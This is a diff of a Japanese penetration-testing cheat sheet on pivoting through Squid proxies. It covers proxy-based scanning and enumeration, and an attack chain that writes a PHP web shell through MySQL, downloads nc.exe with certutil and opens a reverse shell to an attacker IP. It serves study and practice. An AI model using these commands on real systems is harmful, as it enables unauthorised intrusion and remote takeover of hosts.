@@ -19,22 +19,24 @@ PORT     STATE  SERVICE    VERSION
 
 ---
 
->[!NOTE]
->以下、`<squid_IP>` はSquidが動作しているIPを指し、`<TargetIP>` はsquid 経由でアクセスしたいIP（多くは内部NWのインターフェース）を指す
+>[!Info]
+>以下、`<squid_IP>` はSquidが動作しているIPを指し、`<target_IP>` はsquid 経由でアクセスしたいIP（多くは内部NWのインターフェース）を指している。
 
 # 接続
 
 ## curlでプロキシ経由アクセス
 
 ```zsh
-curl --proxy http://<squid_IP>:3128 http://<TargetIP>
+curl --proxy http://<squid_IP>:3128 http://<target_IP>
 ```
 
 ## ブラウザ（FoxyProxy等）でプロキシ設定
 
 FirefoxのFoxyProxy等でSquidのIPとポート3128を指定する。  
 認証が必要な場合はユーザー名・パスワードも設定する。
+
 ![](../../画像ファイル/Pasted%20image%2020260220195415.png)
+
 $$FoxyProxy設定例$$
 
 ---
@@ -44,15 +46,15 @@ $$FoxyProxy設定例$$
 バージョン確認
 ```zsh
 # nmapによるバージョン検出
-nmap -sV -p 3128 <TargetIP>
+nmap -sV -p 3128 <target_IP>
 
 # curlでヘッダ確認
-curl -I http://<TargetIP>:3128
+curl -I http://<target_IP>:3128
 ```
 
 匿名アクセス確認（認証なしで通るか）
 ```zsh
-curl --proxy http://<squid_IP>:3128 http://<TargetIP>
+curl --proxy http://<squid_IP>:3128 http://<target_IP>
 ```
 - 200が返れば匿名アクセスが有効
 - 407が返ればプロキシ認証が必要
@@ -79,10 +81,10 @@ http <squid_IP> 3128 <username> <password>
 proxychainsからnmapを実行
 ```sh
 # 全ポートスキャン
-ports=$(sudo proxychains nmap -sT -Pn <TargetIP> -p- -n --min-rate=1000 | grep '^[0-9]' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
+ports=$(sudo proxychains nmap -sT -Pn <target_IP> -p- -n --min-rate=1000 | grep '^[0-9]' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
 
 # 詳細スキャン
-sudo proxychains nmap -sT -Pn <TargetIP> -p $ports -n -A -sV -oN Nmap/scan_via_proxy.nmap
+sudo proxychains nmap -sT -Pn <target_IP> -p $ports -n -A -sV -oN Nmap/scan_via_proxy.nmap
 ```
 
 >[!TIP]
@@ -97,32 +99,32 @@ sudo proxychains nmap -sT -Pn <TargetIP> -p $ports -n -A -sV -oN Nmap/scan_via_p
 
 認証なしのときのみ使用可能
 
-[spose.py](https://github.com/aancw/spose)を使ったSquid経由のポートスキャン
+🔗[spose.py](https://github.com/aancw/spose)を使ったSquid経由のポートスキャン
 ```zsh
-python3 spose.py --proxy http://<squid_IP>:3128 --target <TargetIP>
+python3 spose.py --proxy http://<squid_IP>:3128 --target <target_IP>
 ```
-- 関連ノート：[コンパイル・ビルド](../../Misc/コンパイル・ビルド.md#Python%20Package%20Management%20(pip))
+- 関連ノート：[Python Package Management (pip)](../../Misc/コンパイル・ビルド.md#Python%20Package%20Management%20(pip))
 
 ## 各ツールのプロキシ対応オプション
 
 curl
 ```sh
-curl -v --proxy http://<squid_IP>:3128 [-U <username>:<password>] http://<TargetIP>
+curl -v --proxy http://<squid_IP>:3128 [-U <username>:<password>] http://<target_IP>
 ```
 
 Gobuster
 ```zsh
-gobuster dir -u http://<TargetIP|Domain>:<Port>/ -r -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -o gobuster.txt -x '<extensions>' --proxy http://<squid_IP>:3128
+gobuster dir -u http://<target_IP|Domain>:<Port>/ -r -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -o gobuster.txt -x '<extensions>' --proxy http://<squid_IP>:3128
 ```
 
 Nikto
 ```zsh
-nikto -h <TargetIP> -useproxy http://<squid_IP>:3128
+nikto -h <target_IP> -useproxy http://<squid_IP>:3128
 ```
 
 WPScan
 ```zsh
-wpscan --url http://<TargetIP>/wordpress --wp-content-dir wp-content --proxy http://<squid_IP>:3128
+wpscan --url http://<target_IP>/wordpress --wp-content-dir wp-content --proxy http://<squid_IP>:3128
 ```
 
 ---
@@ -132,13 +134,12 @@ wpscan --url http://<TargetIP>/wordpress --wp-content-dir wp-content --proxy htt
 ## プロキシ経由での隠れたポートへのアクセス
 
 Squidプロキシが動いているターゲットでは、直接アクセスできない内部ポートが存在することがある。  
-[3128 - Squid](#SPOSE%20Scanner) などでスキャンして開いているポートを特定し、ブラウザのプロキシ設定経由でアクセスする。
+[SPOSE Scanner](#SPOSE%20Scanner) などでスキャンして開いているポートを特定し、ブラウザのプロキシ設定経由でアクセスする。
 
 典型的な攻撃フロー：
-
 1. SPOSEで内部ポートスキャン → 例：8080が開いていることを確認
 2. FoxyProxy等でプロキシ設定（`<squid_IP>:3128`）
-3. ブラウザで `http://<TargetIP>:8080` にアクセス → 内部サービスが見える
+3. ブラウザで `http://<target_IP>:8080` にアクセス → 内部サービスが見える
 4. 内部サービス（phpMyAdmin、wamp等）を調査し、さらなる侵入経路を探す
 
 ## MySQL/phpMyAdmin経由でのRCE（Windowsの場合）
@@ -155,7 +156,7 @@ select '<?php system($_GET["cmd"]); ?>' into outfile 'C:/wamp/www/shell.php';
 
 WebShell確認
 ```
-http://<TargetIP>:8080/shell.php?cmd=whoami
+http://<target_IP>:8080/shell.php?cmd=whoami
 ```
 
 リバースシェル取得（certutilでnc.exeをダウンロード）
@@ -168,7 +169,7 @@ nc.exe <AttackerIP> 443 -e cmd.exe
 
 ---
 
-# Squid設定ファイルの見方（参考）
+# 参考：Squid設定ファイルの見方
 
 設定ファイルパス: `/etc/squid3/squid.conf`
 
